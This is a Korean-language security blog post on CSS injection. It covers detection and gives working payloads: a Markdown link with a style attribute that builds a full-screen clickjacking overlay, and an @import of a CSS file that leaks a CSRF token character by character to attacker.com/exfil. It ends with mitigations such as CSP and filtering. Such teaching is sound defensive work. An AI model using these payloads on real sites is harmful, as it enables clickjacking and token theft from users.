---
layout: post
title: CSS Injection
subtitle: Style 속성 및 태그를 활용한 공격
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - Style
  - CSS
  - Clickjacking
  - KeyLogging
  - WEB
sidebar:
---
## Intro
CSS Injection은 사용자가 `<style>` 태그 혹은 style 속성을 임의로 삽입할 수 있을 때 나타나는 취약점입니다.   

해당 취약점은 그 자체 위험도는 크지 않다고 생각하지만, User Interaction이 필요한 취약점을 쉽게 트리거 되도록 만들 수 있습니다.   

주로 `<a>` 태그에 사용하여 ***사용자의 클릭을 하이제킹***하는 Payload를 사용합니다. 혹은 `<style>`, `<link>` 태그가 삽입이 가능할 시 .css 파일을 불러올 수 있어 이 때는 ***Keylogging 혹은 CSRF 토큰 탈취*** 용도로 Payload를 작성할 수 있습니다.
## Detect & Exploit 
### Detect
탐지 방법의 경우 XSS와 유사합니다.   
`<style>` 태그 및 style 속성을 임의로 삽입할 수 있는 지 여부를 살피면 됩니다.
### Exploit
> 🕶️ Clickjacking 목적이라면 부모 태그를 벗어나 페이지 어디에나 위치시킬 수 있는 `position` 속성이 가장 중요합니다. 

```Markdown
# In Markdown
[Clickjacking](https://attack.com"style="position:fixed;top:0;left:0;width:100vw;height:100vh;background-color:transparent;z-index:9999;)

# In Custom Color Setting
bgColor=#000%3B%20position:fixed%3B...[위와 동일]
```

```
# In Tag
<style>@import ("https://attacker.com/POC.css")</style>

# POC.css
input[name=csrf][value^=a]{
    background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
    background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
    background-image: url(https://attacker.com/exfil/9);   
}
```

## Security Measures
가장 좋은 방법은 사용자가 임의로 `<style>` 태그 및 속성을 삽입할 수 없도록 조치하는 것입니다.   
서비스 특성 상 해당 조치 방법이 어려울 경우 CSP 정책을 통해 외부 링크에서 .css 파일을 가져오지 못하도록 하고, `position` 속성 등을 필터링 하여 악성 링크가 담긴 태그가 페이지 내 자유롭게 위치할 수 없도록 해야 합니다.
## References
[Better Exfiltration via HTML Injection](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
[CSS Injection](https://book.hacktricks.xyz/kr/pentesting-web/xs-search/css-injection)